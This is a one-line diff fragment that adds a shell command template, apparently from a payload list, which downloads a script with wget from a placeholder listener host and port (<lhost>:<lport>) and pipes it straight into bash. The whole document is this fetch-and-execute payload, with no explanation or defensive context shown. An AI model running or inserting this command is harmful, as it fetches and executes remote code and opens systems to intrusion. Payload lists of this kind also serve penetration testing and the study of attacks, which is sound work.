@@ -1,0 +1,1 @@
+bash <(wget -qO- http://<lhost>:<lport><path>)
